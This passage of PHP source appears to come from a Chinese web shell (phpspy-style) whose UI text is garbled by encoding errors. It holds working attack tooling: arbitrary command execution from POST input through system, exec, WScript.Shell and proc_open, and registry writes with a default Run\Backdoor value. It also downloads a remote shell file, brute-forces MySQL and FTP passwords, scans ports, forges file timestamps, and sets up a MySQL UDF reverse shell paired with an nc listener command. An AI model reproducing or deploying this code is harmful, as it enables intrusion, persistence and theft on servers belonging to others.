			echo "  <td align=\"center\" nowrap class=\"smlfont\"><a href=\"?action=search&dir=".$filepath."\">Search</a></td>\n";
			echo "  <td align=\"center\" nowrap class=\"smlfont\"><a href=\"?action=fileperm&dir=".urlencode($dir)."&file=".urlencode($file)."\">$dirperm</a></td>\n";
			echo "  <td align=\"center\" nowrap>| <a href=\"#\" onclick=\"really('".urlencode($dir)."','".urlencode($file)."','��ȷ��Ҫɾ�� $file Ŀ¼��? \\n\\n�����Ŀ¼�ǿ�,�˴β�������ɾ����Ŀ¼�µ������ļ�!','1')\">ɾ��</a> | <a href=\"?action=rename&dir=".urlencode($dir)."&fname=".urlencode($file)."\">����</a> |</td>\n";
			echo "</tr>\n";
			$dir_i++;
		} else {
			if($file=="..") {
				echo "<tr class=".getrowbg().">\n";
				echo "  <td nowrap colspan=\"6\" style=\"padding-left: 5px;\"><a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\">�����ϼ�Ŀ¼</a></td>\n";
				echo "</tr>\n";
			}
		}
	}
}// while
@closedir($dirs); 
?>
<tr bgcolor="#cccccc">
  <td colspan="6" height="5"></td>
</tr>
<?
// �ļ��б�
$dirs=@opendir($dir);
$file_i = '0';
while ($file=@readdir($dirs)) {
	$filepath="$dir/$file";
	$a=@is_dir($filepath);
	if($a=="0"){		
		$size=@filesize($filepath);
		$size=$size/1024 ;
		$size= @number_format($size, 3);
		if (@filectime($filepath) == @filemtime($filepath)) {
			$ctime=@date("Y-m-d H:i:s",@filectime($filepath));
			$mtime=@date("Y-m-d H:i:s",@filemtime($filepath));
		} else {
			$ctime="<span class=\"redfont\">".@date("Y-m-d H:i:s",@filectime($filepath))."</span>";
			$mtime="<span class=\"redfont\">".@date("Y-m-d H:i:s",@filemtime($filepath))."</span>";
		}
		@$fileperm=substr(base_convert(@fileperms($filepath),10,8),-4);
		echo "<tr class=".getrowbg().">\n";
		echo "  <td style=\"padding-left: 5px;\">";
		echo "<INPUT type=checkbox value=$file name=dl[]>";
		echo "<a href=\"$filepath\" target=\"_blank\">$file</a></td>\n";
		echo "  <td align=\"center\" nowrap class=\"smlfont\">$ctime</td>\n";
		echo "  <td align=\"center\" nowrap class=\"smlfont\">$mtime</td>\n";
		echo "  <td align=\"right\" nowrap class=\"smlfont\"><span class=\"redfont\">$size</span> KB</td>\n";
		echo "  <td align=\"center\" nowrap class=\"smlfont\"><a href=\"?action=fileperm&dir=".urlencode($dir)."&file=".urlencode($file)."\">$fileperm</a></td>\n";
		echo "  <td align=\"center\" nowrap><a href=\"?downfile=".urlencode($filepath)."\">����</a> | <a href=\"?action=editfile&dir=".urlencode($dir)."&editfile=".urlencode($file)."\">�༭</a> | <a href=\"#\" onclick=\"really('".urlencode($dir)."','".urlencode($filepath)."','��ȷ��Ҫɾ�� $file �ļ���?','2')\">ɾ��</a> | <a href=\"?action=rename&dir=".urlencode($dir)."&fname=".urlencode($filepath)."\">����</a> | <a href=\"?action=newtime&dir=".urlencode($dir)."&file=".urlencode($filepath)."\">ʱ��</a></td>\n";
		echo "</tr>\n";
		$file_i++;
	}
}// while
@closedir($dirs); 
if(get_cfg_var('safemode'))$z = "<a href=\"#\" title=\"ʹ��˵��\" onclick=\"alert('PhpΪ��ȫģʽ�����ٴ����������ű���ʱ\\n\\n��д�ļ�������ļ������ڱ��ط������,������ֱ�����ء�')\">(?)</a>";
else $z = "<a href=\"#\" title=\"ʹ��˵��\" onclick=\"alert('Php���зǰ�ȫģʽ����������Ȱ��Ȱ��Ȱ���\\n\\n��д�ļ�������ļ������ڱ��ط��������������ֱ�����ء�')\">(?)</a>";
$tb->tdbody('<table width="100%" border="0" cellpadding="2" cellspacing="0" align="center"><tr><td>'.$tb->makeinput('chkall','on','onclick="CheckAll(this.form)"','checkbox','30','').' �����ļ���'.$tb->makeinput('localfile','','','text','15').''.$tb->makeinput('downrar','ѡ�д�����ػ򱾵ر���','','submit').' &nbsp'.$z.'</td><td align="right">'.$dir_i.' ��Ŀ¼ / '.$file_i.' ���ļ�</td></tr></table>','center',getrowbg(),'','','6');

echo "</FORM>\n";
echo "</table>\n";
}// end dir

elseif ($_GET['action'] == "editfile") {
	if(empty($newfile)) {
		$filename="$dir/$editfile";
		$fp=@fopen($filename,"r");
		$contents=@fread($fp, filesize($filename));
		@fclose($fp);
		$contents=htmlspecialchars($contents);
	}else{
		$editfile=$newfile;
		$filename = "$dir/$editfile";
	}
	$action = "?dir=".urlencode($dir)."&editfile=".$editfile;
	$tb->tableheader();
	$tb->formheader($action,'�½�/�༭�ļ�');
	$tb->tdbody('��ǰ�ļ�: '.$tb->makeinput('editfilename',$filename).' �������ļ����������ļ� Php�������: <input type="checkbox" name="change" value="yes" onclick="javascript:alert(\'�������ֻ�����������ܻ���ѹ��������php���롣\\n\\n��php���������php�����֧��gzinflate�����벻Ҫʹ�ã�\')"> ');
	$tb->tdbody($tb->maketextarea('filecontent',$contents));
	$tb->makehidden('do','doeditfile');
	$tb->formfooter('1','30');
}//end editfile

elseif ($_GET['action'] == "rename") {
	$nowfile = (isset($_POST['newname'])) ? $_POST['newname'] : basename($_GET['fname']);
	$action = "?dir=".urlencode($dir)."&fname=".urlencode($fname);
	$tb->tableheader();
	$tb->formheader($action,'�޸��ļ���');
	$tb->makehidden('oldname',$dir."/".$nowfile);
	$tb->makehidden('dir',$dir);
	$tb->tdbody('��ǰ�ļ���: '.basename($nowfile));
	$tb->tdbody('����Ϊ: '.$tb->makeinput('newname'));
	$tb->makehidden('do','rename');
	$tb->formfooter('1','30');
}//end rename

elseif ($_GET['action'] == "eval") {
	$action = "?dir=".urlencode($dir)."";
	$tb->tableheader();
	$tb->formheader(''.$action.' "target="_blank' ,'ִ��php�ű�');
	$tb->tdbody($tb->maketextarea('phpcode',$contents));
	$tb->formfooter('1','30');
	
}
elseif ($_GET['action'] == "fileperm") {
	$action = "?dir=".urlencode($dir)."&file=".$file;
	$tb->tableheader();
	$tb->formheader($action,'�޸��ļ�����');
	$tb->tdbody('�޸� '.$file.' ������Ϊ: '.$tb->makeinput('fileperm',substr(base_convert(fileperms($dir.'/'.$file),10,8),-4)));
	$tb->makehidden('file',$file);
	$tb->makehidden('dir',urlencode($dir));
	$tb->makehidden('do','editfileperm');
	$tb->formfooter('1','30');
}//end fileperm

elseif ($_GET['action'] == "newtime") {
	$action = "?dir=".urlencode($dir);
	$cachemonth = array('January'=>1,'February'=>2,'March'=>3,'April'=>4,'May'=>5,'June'=>6,'July'=>7,'August'=>8,'September'=>9,'October'=>10,'November'=>11,'December'=>12);
	$tb->tableheader();
	$tb->formheader($action,'��¡�ļ�����޸�ʱ��');
	$tb->tdbody("�޸��ļ�: ".$tb->makeinput('curfile',$file,'readonly')." �� Ŀ���ļ�: ".$tb->makeinput('tarfile','��������·�����ļ���'),'center','2','30');
	$tb->makehidden('do','domodtime');
	$tb->formfooter('','30');
	$tb->formheader($action,'�Զ����ļ�����޸�ʱ��');
	$tb->tdbody('<br><ul><li>��Ч��ʱ������ͷ�Χ�ǴӸ�������ʱ�� 1901 �� 12 �� 13 �� ������ 20:45:54 �� 2038�� 1 �� 19 �� ���ڶ� 03:14:07<br>(�����ڸ��� 32 λ�з�����������Сֵ�����ֵ����)</li><li>˵��: ��ȡ 01 �� 30 ֮��, ʱȡ 0 �� 24 ֮��, �ֺ���ȡ 0 �� 60 ֮��!</li></ul>','left');
	$tb->tdbody('��ǰ�ļ���: '.$file);
	$tb->makehidden('curfile',$file);
	$tb->tdbody('�޸�Ϊ: '.$tb->makeinput('year','1984','','text','4').' �� '.$tb->makeselect(array('name'=>'month','option'=>$cachemonth,'selected'=>'October')).' �� '.$tb->makeinput('data','18','','text','2').' �� '.$tb->makeinput('hour','20','','text','2').' ʱ '.$tb->makeinput('minute','00','','text','2').' �� '.$tb->makeinput('second','00','','text','2').' ��','center','2','30');
	$tb->makehidden('do','modmytime');
	$tb->formfooter('1','30');
}//end newtime

elseif ($_GET['action'] == "shell") {
	$action = "??action=shell&dir=".urlencode($dir);
	$tb->tableheader();
	$tb->tdheader('WebShell Mode');
  if (substr(PHP_OS, 0, 3) == 'WIN') {
		$program = isset($_POST['program']) ? $_POST['program'] : "c:\winnt\system32\cmd.exe";
		$prog = isset($_POST['prog']) ? $_POST['prog'] : "/c net start > ".$pathname."/log.txt";
		echo "<form action=\"?action=shell&dir=".urlencode($dir)."\" method=\"POST\">\n";
		$tb->tdbody('�޻������г��� �� �ļ�: '.$tb->makeinput('program',$program).' ����: '.$tb->makeinput('prog',$prog,'','text','40').' '.$tb->makeinput('','Run','','submit'),'center','2','35');
		$tb->makehidden('do','programrun');
		echo "</form>\n";
	}
 echo "<form action=\"?action=shell&dir=".urlencode($dir)."\" method=\"POST\">\n";
 if(isset($_POST['cmd'])) $cmd = $_POST['cmd'];
	$tb->tdbody('��ʾ:�������������ȫ,�����������д���ļ�.�������Եõ�ȫ������. ');
	$tb->tdbody('proc_open�������費��Ĭ�ϵ�winntϵͳ����������ʹ��,�����޸ļǵ�д�˳�,�����������������һ��δ�����Ľ���.');
	$tb->tdbody('proc_open����Ҫʹ�õ�cmd�����λ��:'.$tb->makeinput('cmd',$cmd,'','text','30').'(Ҫ����linuxϵͳ�Լ��޸İ�)');
   $execfuncs = (substr(PHP_OS, 0, 3) == 'WIN') ? array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'shell_exec','popen'=>'popen','wscript'=>'Wscript.Shell','proc_open'=>'proc_open') : array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'shell_exec','popen'=>'popen','proc_open'=>'proc_open');
   $tb->tdbody('ѡ��ִ�к���: '.$tb->makeselect(array('name'=>'execfunc','option'=>$execfuncs,'selected'=>$execfunc)).' ��������: '.$tb->makeinput('command',$_POST['command'],'','text','60').' '.$tb->makeinput('','Run','','submit'));
?>
  <tr class="secondalt">
    <td align="center"><textarea name="textarea" cols="100" rows="25" readonly><?php
	if (!empty($_POST['command'])) {
		if ($execfunc=="system") {
			system($_POST['command']);
		} elseif ($execfunc=="passthru") {
			passthru($_POST['command']);
		} elseif ($execfunc=="exec") {
			$result = exec($_POST['command']);
			echo $result;
		} elseif ($execfunc=="shell_exec") {
			$result=shell_exec($_POST['command']);
			echo $result;	
		} elseif ($execfunc=="popen") {
			$pp = popen($_POST['command'], 'r');
			$read = fread($pp, 2096);
			echo $read;
			pclose($pp);
		} elseif ($execfunc=="wscript") {
			$wsh = new COM('W'.'Scr'.'ip'.'t.she'.'ll') or die("PHP Create COM WSHSHELL failed");
			$exec = $wsh->exec ("cm"."d.e"."xe /c ".$_POST['command']."");
			$stdout = $exec->StdOut();
			$stroutput = $stdout->ReadAll();
			echo $stroutput;
		} elseif($execfunc=="proc_open"){
$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);
$process = proc_open("".$_POST['cmd']."", $descriptorspec, $pipes);
if (is_resource($process)) {

    // д����
    fwrite($pipes[0], "".$_POST['command']."\r\n");
    fwrite($pipes[0], "exit\r\n");
    fclose($pipes[0]);
    // ��ȡ���
    while (!feof($pipes[1])) {
        echo fgets($pipes[1], 1024);
    }
    fclose($pipes[1]);
    while (!feof($pipes[2])) {
        echo fgets($pipes[2], 1024);
      }
    fclose($pipes[2]);

    proc_close($process);
}
		} else {
			system($_POST['command']);
		}
	}
	?></textarea></td>
  </tr>  
  </form>
</table>
<?php
}//end shell

elseif ($_GET['action'] == "reg") {
	$action = '?action=reg';
	$regname = isset($_POST['regname']) ? $_POST['regname'] : 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp\PortNumber';
	$registre = isset($_POST['registre']) ? $_POST['registre'] : 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Backdoor';
	$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\winnt\backdoor.exe';
	$delregname = $_POST['delregname'];
	$tb->tableheader();
	$tb->formheader($action,'��ȡע���');
	$tb->tdbody('��ֵ: '.$tb->makeinput('readregname',$regname,'','text','100').' '.$tb->makeinput('regread','��ȡ','','submit'),'center','2','50');
	echo "</form>";

	$tb->formheader($action,'д��ע���');
	$cacheregtype = array('REG_SZ'=>'REG_SZ','REG_BINARY'=>'REG_BINARY','REG_DWORD'=>'REG_DWORD','REG_MULTI_SZ'=>'REG_MULTI_SZ','REG_EXPAND_SZ'=>'REG_EXPAND_SZ');
	$tb->tdbody('��ֵ: '.$tb->makeinput('writeregname',$registre,'','text','56').' ����: '.$tb->makeselect(array('name'=>'regtype','option'=>$cacheregtype,'selected'=>$regtype)).' ֵ:  '.$tb->makeinput('regval',$regval,'','text','15').' '.$tb->makeinput('regwrite','д��','','submit'),'center','2','50');
	echo "</form>";

	$tb->formheader($action,'ɾ��ע���');
	$tb->tdbody('��ֵ: '.$tb->makeinput('delregname',$delregname,'','text','100').' '.$tb->makeinput('regdelete','ɾ��','','submit'),'center','2','50');
	echo "</form>";
	$tb->tablefooter();
}//end reg
elseif ($_GET['action'] == "downloads"){
$action = '?action=dir';
	$tb->tableheader();
	$tb->formheader($action,'http�ļ�����ģʽ');
	$tb->tdbody('�����ʹ�ñ����ܰ�һЩС������http��ʽ���ص��˷�����','center');
	$tb->tdbody('�ļ�λ��: '.$tb->makeinput('durl','http://www.blackbap.com/bbs/myshell.txt','','text','70').'<br>���ص�:'.$tb->makeinput('path','./myshell.php','','text','60').''.$tb->makehidden('do','downloads').''.$tb->makeinput('','����','','submit'),'center','1','35');
	echo "</form>";
	$tb->tdbody('ע��,�����ļ�̫���޷�������������Ӱ��ִ���ٶ�.','center');
	$tb->tablefooter();
}
elseif ($_GET['action'] == "mix"){
$action = '?action=dir';
	$tb->tableheader();
	$tb->formheader($action,'��ѹ��mix.dll�ļ�');
	$tb->tdbody('��������԰�ѹ����phpspy���mix.dll��ѹ��������','center');
	$tb->tdbody('��ѹ��Ϊ: '.$tb->makeinput('mixto','./mix.dll','','text','70').''.$tb->makehidden('action','mix').''.$tb->makeinput('','unzip','','submit'),'center','1','35');
	echo "</form>";
	$tb->tablefooter();
}
elseif ($_GET['action'] == "crack"){
$action = '?action=dir';
	$tb->tableheader();
	$tb->tdbody('����������Ҫ����ͻ��һЩ�ر�ĵط���׼��������������','center');
	if($type=="crack"){
	$tb->formheader($action,'�����ƽ�mysql��ftp���� <a href="?action=crack">[Mysql����]</a>');
	$tb->tdbody('������������һЩ��������mysql��½������ƽ⡣','center');
	$tb->tdbody('host: '.$tb->makeinput('host','localhost','','text','12').'&nbsp�ʺ�'.$tb->makeinput('user','root','','text','12').''.$tb->makehidden('do','crack').'&nbsp;�ֵ�:'.$tb->makeinput('passfile','./password.txt','','text','20').'&nbsp;һ����̽:'.$tb->makeinput('onetime','100','','text','6').'��&nbsp;'.$tb->makeinput('','crack','','submit'),'center','1','35');
	$tb->tdbody('MYSQL:<input type="radio" name="ctype" value="mysql" checked> &nbsp;&nbsp;Ftp:<input type="radio" name="ctype" value="ftp">','center');
	echo "</form>";
	if(getphpcfg("allow_url_fopen")=="Yes") $temp = "��Զ���ļ�";
	$tb->tdbody('�ֵ����ʹ����Ի����·��'.$temp.'��Ftp�������ƽ�����Ѿ�ͨ����','center');
	$tb->formheader($action,'�˿�ɨ��');
	$tb->tdbody('��������Խ��ж˿ڵļ�ɨ�衣','center');
	$tb->tdbody('host: '.$tb->makeinput('host','127.0.0.1',''.$tb->makehidden('do','port').'','text','12').'&nbsp;�˿ڱ�:'.$tb->makeinput('port',''.$admin[port].'','','text','60').'','center','1','35');
	$tb->tdbody(''.$tb->makeinput('','���ж˿�ɨ��','','submit').'','center');
	echo "</form>";
	$tb->tdbody('�˿ڱ������Ҫ��Ķ˿��ö��Ÿ���!','center');
	$tb->tableheader();
}else{
	$tb->formheader("".$action."\" enctype=\"multipart/form-data",'ʹ��Mysql�ϴ��ļ� <a href="?action=crack&type=crack">[Crack����]</a>');
	$tb->tdbody('����Mysql�����ʺŰ��ļ���mysql��Ȩ�޵���WebshellȨ�ޱ�����д�ĵط�','center');
	$tb->tdbody('Host: '.$tb->makeinput('host','localhost','','text','16').'User: '.$tb->makeinput('user','root','','text','16').'PASS: '.$tb->makeinput('password','','','text','16').'db: '.$tb->makeinput('database','mysql.user','','text','16').'upto: '.$tb->makeinput('uppath','c:/','','text','16').''.$tb->makehidden('action','mysqlup'),'center','1','35');
	$tb->tdbody('�ϴ����ļ���: '.$tb->makeinput('upname','','','text','16').'ѡ���ļ�: '.$tb->makeinput('upfile','','','file','26').''.$tb->makeinput('','upload','','submit'),'center','1','35');
	echo "</form>";
	$tb->tdbody('ò��ֻҪ��fileȨ�޵��ʺžͿ�����,��д�ϴ����ļ�����Ϊԭ���ļ�����.','center');
	$tb->formheader($action,'����Mysql�����ļ�');
	$tb->tdbody('����Mysql�����ʺ�����Webshell���ܶ�ȡ���ص��ļ������ݿ�������ļ��� ����ѹ���� <input type="checkbox" name="rardown" value="yes" onclick="javascript:alert(\'ʹ�ô˹��ܵ�ʱ���RARѹ������������ѡ����ļ���!\')"> ','center');
	$tb->tdbody('Host: '.$tb->makeinput('host','localhost','','text','16').'User: '.$tb->makeinput('user','root','','text','16').'PASS: '.$tb->makeinput('password','','','text','16').''.$tb->makehidden('action','mysqldown').'�ļ�: '.$tb->makeinput('filename','C:/windows/php.ini','','text','26').''.$tb->makeinput('','download','','submit'),'center','1','35');
	echo "</form>";
	$tb->tdbody('ò��ֻҪ��fileȨ�޵��ʺžͿ�����,���ٿ��Զ����ھ���.','center');
	$tb->tdbody('WindowsĬ�������MysqlΪSystemȨ�ޣ���Linuxϵͳ��Ȩ�޲��ߡ�.','center');
}
	$tb->tablefooter();
}
elseif ($_GET['action'] == "search"){
$action = '?dir='.$dir.'';
	$tb->tableheader();
	$tb->formheader($action,'�ļ�����');
	$tb->tdbody('�����ʹ�ñ����ܲ���һ��Ŀ¼�µ��ļ�����д�ļ������Źؼ���!','center');
	$tb->tdbody('�ļ�λ��: '.$tb->makeinput('path',''.$nowpath.'','','text','70').'<br>��������:'.$tb->makeinput('oldkey','ϰ����Ϣ����','','text','60').''.$tb->makehidden('do','search').'<br> �Ƿ����������<input type="checkbox" name="type" value="list" onclick="javascript:alert(\'ѡ���˴������г��ؼ����������ļ��Ķ�����,�����ڵ����ļ��ж����н��бȶ�\\n\\n��ʽΪ:[������/�ļ�����]����[12/99],�������з���.\\n\\n�˹��ܿ��ܻ�����һ���ֵ���ʱ,�뿼��ʹ��,û�пɶ�Ȩ�޽�����!\')"> (�˹��ܺ�����һ�����ܻ�Ӱ��ִ���ٶȣ�����Ĭ�Ϲر�!) <br>�ʵ���ȡ:<input type="checkbox" name="type2" value="getpath" onclick="javascript:alert(\'ѡ���˴������г��ؼ���������λ�ü����趨���������ڵĲ����ַ�..\\n\\n��ȡ�˹��ܲ������ļ��������ƶ����ҵ����ļ����ϼ��ɶ�ȡ����....\\n\\n�˹��ܿ��ܻ�����һ���ֵ���ʱ,�뿼��ʹ��,û�пɶ�Ȩ�޽�����!\')"> ��ȡ�ؼ���ǰ'.$tb->makeinput('beline','0','','text','3').'���ַ� '.$tb->makehidden('dir',''.$dir.'').'���ؼ��ʺ��'.$tb->makeinput('endline','10','','text','3').'���ַ�... '.$tb->makehidden('dir',''.$dir.'').''.$tb->makeinput('','��ʼ�����ļ�','','submit'),'center','1','35');
	echo "</form>";
	$tb->tdbody('���̫���Ŀ¼�ˣ�������������Һò�����.����ѡ���������ٶȻ�������ʾ[������/�ܹ�������]','center');
	$tb->tablefooter();
}
elseif ($_GET['action'] == "proxy") {
	$action = '?action=proxy';
	$tb->tableheader();
	$tb->formheader($action,'���ߴ���','proxyframe');
	$tb->tdbody('<br><ul><li>�ñ����ܽ�ʵ�ּ򵥵� HTTP ����,������ʾʹ�����·����ͼƬ�����Ӽ�CSS��ʽ��.</li><li>�ñ����ܿ���ͨ�������������Ŀ��URL,����֧�� SQL Injection ̽���Լ�ĳЩ�����ַ�.</li><li>�ñ���������� URL,��Ŀ�����������µ�IP��¼�� : '.gethostbyname($_SERVER['SERVER_NAME']).'</li></ul>','left');
	$tb->tdbody('URL: '.$tb->makeinput('url','http://www.blackbap.com','','text','100').' '.$tb->makeinput('','���','','submit'),'center','1','40');
	$tb->tdbody('<iframe name="proxyframe" frameborder="0" width="765" height="400" marginheight="0" marginwidth="0" scrolling="auto" src="http://www.blackbap.com"></iframe>');
	echo "</form>";
	$tb->tablefooter();
}//end proxy

elseif ($_GET['action'] == "sql") {
	$action = '?action=sql';

	$servername = isset($_POST['servername']) ? $_POST['servername'] : 'localhost';
	$dbusername = isset($_POST['dbusername']) ? $_POST['dbusername'] : 'root';
	$dbpassword = $_POST['dbpassword'];
	$dbname = $_POST['dbname'];
	$sql_query = $_POST['sql_query'];
if($type=="fun"){
$sql_query = "CREATE FUNCTION Mixconnect RETURNS STRING SONAME 'C:\\\Winnt\\\Mix.dll';
select Mixconnect('".$_SERVER['REMOTE_ADDR']."','8888');/*��������ִ��������һ������*/
/*������������ִ�� nc -vv -l -p 8888*/";
}
	$tb->tableheader();
	$tb->formheader($action,'ִ�� SQL ���');
	$tb->tdbody('Host: '.$tb->makeinput('servername',$servername,'','text','20').' User: '.$tb->makeinput('dbusername',$dbusername,'','text','15').' Pass: '.$tb->makeinput('dbpassword',$dbpassword,'','text','15').' DB: '.$tb->makeinput('dbname',$dbname,'','text','15').' '.$tb->makeinput('connect','����','','submit'));
	$tb->tdbody($tb->maketextarea('sql_query',$sql_query,'85','10'));
	$tb->makehidden('do','query');
	$tb->formfooter('1','30');
}//end sql query

elseif ($_GET['action'] == "sqlbak") {
	$action = '?action=sqlbak';
	$servername = isset($_POST['servername']) ? $_POST['servername'] : 'localhost';
	$dbusername = isset($_POST['dbusername']) ? $_POST['dbusername'] : 'root';
	$dbpassword = $_POST['dbpassword'];
	$dbname = $_POST['dbname'];
	$tb->tableheader();
	$tb->formheader($action,'���� MySQL ���ݿ�');
	$tb->tdbody('Host: '.$tb->makeinput('servername',$servername,'','text','20').' User: '.$tb->makeinput('dbusername',$dbusername,'','text','15').' Pass: '.$tb->makeinput('dbpassword',$dbpassword,'','text','15').' DB: '.$tb->makeinput('dbname',$dbname,'','text','15').' '.$tb->makeinput('connect','����','','submit'));
	@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname);
    $tables = @mysql_list_tables($dbname);
    while ($table = @mysql_fetch_row($tables)) {
		$cachetables[$table[0]] = $table[0];
    }
    @mysql_free_result($tables);
	if (empty($cachetables)) {
		$tb->tdbody('<b>��û���������ݿ� or ��ǰ���ݿ�û���κ����ݱ�</b>');
	} else {
		$tb->tdbody('<table border="0" cellpadding="3" cellspacing="1"><tr><td valign="top">��ѡ���:</td><td>'.$tb->makeselect(array('name'=>'table[]','option'=>$cachetables,'multiple'=>1,'size'=>15,'css'=>1)).'</td></tr><tr nowrap><td><input type="radio" name="backuptype" value="server" checked> ���������������·��:</td><td>'.$tb->makeinput('path',$pathname.'/'.$_SERVER['HTTP_HOST'].'_MySQL.sql','','text','50').'</td></tr><tr nowrap><td colspan="2"><input type="radio" name="backuptype" value="download"> ֱ�����ص����� (�ʺ���������С�����ݿ�)</td></tr></table>');
		$tb->makehidden('do','backupmysql');
		$tb->formfooter('0','30');
	}
	$tb->tablefooter();
	@mysql_close();
}//end sql backup

elseif ($_GET['action'] == "phpenv") {
	$user = " <a href=\"?action=nowuser\" target=\"_blank\">����crush��˻�ȡ��ǰ�����û���</a> ";
	$upsize=get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "�������ϴ�";
	$adminmail=(isset($_SERVER['SERVER_ADMIN'])) ? "<a href=\"mailto:".$_SERVER['SERVER_ADMIN']."\">".$_SERVER['SERVER_ADMIN']."</a>" : "<a href=\"mailto:".get_cfg_var("sendmail_from")."\">".get_cfg_var("sendmail_from")."</a>";
	if ($dis_func == "") {
		$dis_func = "No";
	}else {
		$dis_func = str_replace(" ","<br>",$dis_func);
		$dis_func = str_replace(",","<br>",$dis_func);
	}
	$phpinfo=(!eregi("phpinfo",$dis_func)) ? "Yes" : "No";
		$info = array(
		    0 => array("��ǰphp�����û�",$user),
			1 => array("����������ϵͳ",PHP_OS),
			2 => array("������ʱ��",date("Y��m��d�� h:i:s",time())),
			3 => array("����������","<a href=\"http://".$_SERVER['SERVER_NAME']."\" target=\"_blank\">".$_SERVER['SERVER_NAME']."</a>"),
			4 => array("������IP��ַ",gethostbyname($_SERVER['SERVER_NAME'])),
			5 => array("����������ϵͳ���ֱ���",$_SERVER['HTTP_ACCEPT_LANGUAGE']),
			6 => array("��������������",$_SERVER['SERVER_SOFTWARE']),
			7 => array("Web����˿�",$_SERVER['SERVER_PORT']),
			8 => array("PHP���з�ʽ",strtoupper(php_sapi_name())),
			9 => array("PHP�汾",PHP_VERSION),
			10 => array("�����ڰ�ȫģʽ",getphpcfg("safemode")),
			11 => array("����������Ա",$adminmail),
			12 => array("���ļ�·��",__FILE__),
            13 => array("����ʹ�� URL ���ļ� allow_url_fopen",getphpcfg("allow_url_fopen")),
			14 => array("����̬�������ӿ� enable_dl",getphpcfg("enable_dl")),
			15 => array("��ʾ������Ϣ display_errors",getphpcfg("display_errors")),
			16 => array("�Զ�����ȫ�ֱ��� register_globals",getphpcfg("register_globals")),
			17 => array("magic_quotes_gpc",getphpcfg("magic_quotes_gpc")),
			18 => array("�����������ʹ���ڴ��� memory_limit",getphpcfg("memory_limit")),
			19 => array("POST����ֽ��� post_max_size",getphpcfg("post_max_size")),
			20 => array("��������ϴ��ļ� upload_max_filesize",$upsize),
			21 => array("���������ʱ�� max_execution_time",getphpcfg("max_execution_time")."��"),
			22 => array("�����õĺ��� disable_functions",$dis_func),
			23 => array("phpinfo()",$phpinfo),
			24 => array("Ŀǰ���п���ռ�diskfreespace",intval(diskfreespace(".") / (1024 * 1024)).'Mb'),
            25 => array("ͼ�δ��� GD Library",getfun("imageline")),
			26 => array("IMAP�����ʼ�ϵͳ",getfun("imap_close")),
			27 => array("MySQL���ݿ�",getfun("mysql_close")),
			28 => array("SyBase���ݿ�",getfun("sybase_close")),
			29 => array("Oracle���ݿ�",getfun("ora_close")),
			30 => array("Oracle 8 ���ݿ�",getfun("OCILogOff")),
			31 => array("PREL�����﷨ PCRE",getfun("preg_match")),
			32 => array("PDF�ĵ�֧��",getfun("pdf_close")),
			33 => array("Postgre SQL���ݿ�",getfun("pg_close")),
			34 => array("SNMP�������Э��",getfun("snmpget")),
			35 => array("ѹ���ļ�֧��(Zlib)",getfun("gzclose")),
			36 => array("XML����",getfun("xml_set_object")),
			37 => array("FTP",getfun("ftp_login")),
			38 => array("ODBC���ݿ�����",getfun("odbc_close")),
			39 => array("Session֧��",getfun("session_start")),
			40 => array("Socket֧��",getfun("fsockopen")),
		); 
	$tb->tableheader();
	echo "<form action=\"?action=phpenv\" method=\"POST\">\n";
	$tb->tdbody('<b>�鿴PHP���ò���״��</b>','left','1','30','style="padding-left: 5px;"');
	$tb->tdbody('���������ò���(��:magic_quotes_gpc): '.$tb->makeinput('phpvarname','','','text','40').' '.$tb->makeinput('','�鿴','','submit'),'left','2','30','style="padding-left: 5px;"');
	$tb->makehidden('do','viewphpvar');
	echo "</form>\n";
	$hp = array(0=> '����������', 1=> 'PHP��������', 2=> '���֧��״��');
	for ($a=0;$a<3;$a++) {
		$tb->tdbody('<b>'.$hp[1].'</b>','left','1','30','style="padding-left: 5px;"');
?>
  <tr class="secondalt">
    <td>
      <table width="100%" border="0" cellpadding="0" cellspacing="0">
<?php
		if ($a==0) {
			for($i=0;$i<=12;$i++) {
				echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
			}
		} elseif ($a == 1) {
			for ($i=13;$i<=24;$i++) {
				echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
			}
		} elseif ($a == 2) {
			for ($i=25;$i<=40;$i++) {
				echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
			}
		}
?>
      </table>
    </td>
  </tr>
<?php
	}//for
echo "</table>";
}//end phpenv
elseif($_GET['action'] == "mysqlfun"){
	  echo "<table width=\"760\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" bgcolor=\"#ffffff\"><tr class=\"firstalt\"><td align=\"left\">";
	if($_POST['port'] != "" && $_POST['ip'] != "" && $_POST['function'] != ""  && $_POST['host'] != "" && $_POST['user'] != "")
    {
		$link=@mysql_connect($_POST['host'],$_POST['user'],$_POST['pass']);
		if (!$link) {
			 echo "<font color=red>Could not connect: ".mysql_error()."</font><br>";
			 }
			 else{
			 echo "<font color=blue>Connected successfully as ".$_POST['user']."</font><br>";
			 if(isset($_POST['mixpath'])&&!@file_exists($_POST['mixpath'])){
			echo"<font color=red>Can't find the ".$_POST['mixpath']."</font><br>";
			 }
			if(isset($_POST['mixpath'])){
			 $dll_path = addslashes($_POST['mixpath']);
			 $query="create function ".$_POST['function']." returns integer soname '".$dll_path."';";
			 echo (@mysql_query($query, $link)) ? "<font color=blue>Success: ".$query."</font><br>" : "<font color=red>Create function faild!<br>".mysql_error()."</font><br>";
			 }
			 echo"<font color=red>Now Select Function name of ".$_POST['function']."</font><br>";
			 $query="select ".$_POST['function']."('".$_POST['ip']."','".$_POST['port']."');";
			 echo (@mysql_query($query, $link)) ? "<font color=blue>Success: ".$query."</font><br>" : "<font color=red>Select Function name of ".$_POST['function']." faild!<br>".mysql_error()."</font><br>";
			 mysql_close($link);
			 }
			 }else{
